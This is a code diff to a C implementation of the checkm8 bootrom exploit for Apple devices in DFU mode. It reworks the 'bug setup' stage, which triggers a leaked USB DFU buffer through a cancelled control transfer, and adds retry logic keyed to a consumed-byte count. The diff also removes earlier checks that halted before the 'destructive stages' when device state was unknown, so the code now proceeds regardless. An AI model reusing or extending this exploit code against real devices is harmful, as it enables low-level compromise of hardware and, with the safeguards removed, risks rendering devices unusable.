@@ -364,9 +364,14 @@ static int tracedTransfer(irecv_client_t client, const char* label,
 // the controller yet, simply dequeues it and the SETUP never transmits at all.
 // Same reported 0 bytes; opposite device state.
 //
-// So: after the bug setup, macOS should be in dfuDNLOAD_IDLE or dfuDNBUSY
-// (holding a buffer), and if this hypothesis is right Linux will be in dfuIDLE
-// (never saw the request). That is a direct, decisive discriminator.
+// !! That framing was WRONG and is kept only so the retraction makes sense. !!
+// dfuIDLE after the bug setup does NOT mean the device never saw the request:
+// measured, 32 of 35 attempts moved bytes -- so the SETUP certainly arrived --
+// and all 35 still reported dfuIDLE. checkm8 IS a bug in this state machine;
+// the aborted DNLOAD leaks a buffer the state machine stops tracking, so
+// "idle while holding a dangling pointer" is the vulnerability itself. There
+// is no known oracle for the precondition at this stage. This probe remains
+// useful only for gross states such as dfuERROR. See docs/HISTORY.md.
 //
 // !! THIS IS NOT PASSIVE. !!
 // DFU_GETSTATUS advances the DFU state machine -- dfuDNLOAD_SYNC becomes
@@ -485,6 +490,24 @@ static unsigned retryDelayUs(void) {
         if (env && *env) {
             long parsed = strtol(env, NULL, 10);
             if (parsed >= 0 && parsed <= 1000000) value = (unsigned)parsed;
+        }
+        resolved = 1;
+    }
+    return value;
+}
+
+// Consumed-byte count to retry the bug setup until, or -1 to take the first
+// attempt whatever it yields. The count is non-deterministic at a fixed delay,
+// so this pins it; a confirmed-working macOS run consumes 0.
+static int bugSetupTargetConsumed(void) {
+    static int resolved = 0;
+    static int value = -1;
+
+    if (!resolved) {
+        const char* env = getenv("DEBUG_BUGSETUP_TARGET_CONSUMED");
+        if (env && *env) {
+            long parsed = strtol(env, NULL, 10);
+            if (parsed >= 0 && parsed <= 0x800) value = (int)parsed;
         }
         resolved = 1;
     }
@@ -982,11 +1005,32 @@ static int runCheckm8Inner(uint64_t ecid) {
     // path, and its duration is the one hint available as to whether the SETUP
     // reached the wire before the cancel landed. A call that returns in barely
     // more than delayUs never round-tripped anything.
+    // Retry the bug setup until its consumed-byte count hits a target.
+    //
+    // This used to retry until the device reported a DFU state other than
+    // dfuIDLE, on the theory that dfuIDLE meant the SETUP never arrived. That
+    // was refuted by its own output: 32 of 35 attempts moved bytes -- so the
+    // SETUP plainly did arrive -- and every one still reported dfuIDLE.
+    // checkm8 IS a bug in that state machine; the aborted DNLOAD leaks a buffer
+    // the state machine stops tracking, so a device holding the dangling
+    // pointer reporting "idle" is the vulnerability, not evidence against it.
+    // There is no known oracle at this stage. See docs/HISTORY.md.
+    //
+    // What IS observable is the consumed count, and it is non-deterministic at
+    // a fixed delay (0 and 64 both seen at 100us). So this pins the one
+    // variable available: retry until the count matches
+    // DEBUG_BUGSETUP_TARGET_CONSUMED, then proceed. Useful for asking whether
+    // "consumed exactly what macOS consumed" plus everything else downstream
+    // actually works -- a question single-shot runs cannot pose reliably.
+    //
+    // No DFU_GETSTATUS in this loop any more: it is not diagnostic here, and it
+    // was contributing to the EP0 degradation that kills the device after ~35
+    // attempts.
     int maxAttempts = bugSetupRetries();
+    int target = bugSetupTargetConsumed();
     int sent = 0;
     int bugSetupAttempts = 0;
     int sawNonzeroConsumed = 0;
-    int finalDfuState = -2;   // -2 = never checked (single-shot default)
     unsigned long bugSetupElapsed = 0;
 
     for (int attempt = 1; attempt <= maxAttempts; attempt++) {
@@ -995,67 +1039,25 @@ static int runCheckm8Inner(uint64_t ecid) {
         sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, delayUs);
         bugSetupElapsed = nowUs() - bugSetupStarted;
 
-        // Single-shot: behave exactly as before, no GETSTATUS, no decisions.
-        if (maxAttempts == 1) break;
-
         if (sent > 0) sawNonzeroConsumed++;
+        if (maxAttempts == 1 || target < 0 || sent == target) break;
 
-        finalDfuState = readDfuState(client);
-
-        if (finalDfuState < 0) {
-            // The status request itself failed -- EP0 has degraded, which is
-            // NOT evidence that a buffer exists. An earlier version of this
-            // loop treated it as "proceed"; that was wrong, and it proceeded on
-            // precisely the one condition where proceeding is least defensible.
-            // Stop here and leave the destructive stages alone.
-            printf("bug setup: attempt %d -- DFU status request failed, so EP0 has "
-                   "degraded and the device state is unknown. This is NOT a buffer. "
-                   "Stopping before the destructive stages.\n", attempt);
-            break;
-        }
-
-        if (finalDfuState != kDfuStateIdle) {
-            printf("bug setup: attempt %d -- device reports state %d (%s), so it IS "
-                   "holding a download buffer. Proceeding.\n",
-                   attempt, finalDfuState, dfuStateName((unsigned char)finalDfuState));
-            break;
-        }
-
-        // Lost the race: the device never saw the SETUP and is untouched, still
-        // in dfuIDLE. Deliberately NO DFU_ABORT here. An earlier version sent
-        // one between attempts to "keep it clean", and the device's EP0 died
-        // within three iterations. The device is already idle by definition --
-        // that is the condition being retried on -- so the abort was redundant,
-        // and SecureROM's DFU is a minimal implementation that need not handle
-        // an ABORT from dfuIDLE the way the spec describes.
         usleep(retryDelayUs());
 
-        if (attempt % 100 == 0) {
-            printf("bug setup: %d attempts, device still dfuIDLE (SETUP not reaching it)\n",
-                   attempt);
+        if (attempt % 25 == 0) {
+            printf("bug setup: %d attempts, last consumed %d, still hunting for %d\n",
+                   attempt, sent, target);
             fflush(stdout);
         }
     }
 
     if (maxAttempts > 1) {
-        printf("bug setup: %d attempts, %d of them got the device to consume bytes\n",
-               bugSetupAttempts, sawNonzeroConsumed);
-    }
-
-    if (maxAttempts > 1 && finalDfuState < 0) {
-        free(config.payload);
-        irecv_close(client);
-        return 0;
-    }
-
-    if (maxAttempts > 1 && finalDfuState == kDfuStateIdle) {
-        printf("bug setup: gave up after %d attempts -- device never left dfuIDLE, so the "
-               "SETUP never reached it and there is no buffer to groom against. NOT running "
-               "the destructive stages (they are what wedge the device); exiting clean.\n",
-               bugSetupAttempts);
-        free(config.payload);
-        irecv_close(client);
-        return 0;
+        printf("bug setup: %d attempts, %d consumed bytes, final consumed %d (target %d)\n",
+               bugSetupAttempts, sawNonzeroConsumed, sent, target);
+        if (target >= 0 && sent != target) {
+            printf("bug setup: never hit the target -- proceeding anyway, since there is no\n"
+                   "           known oracle for the exploit precondition at this stage.\n");
+        }
     }
     // The one number that decides whether this stage did anything, and it was
     // previously computed and thrown away. Anything outside 0 < sent <=
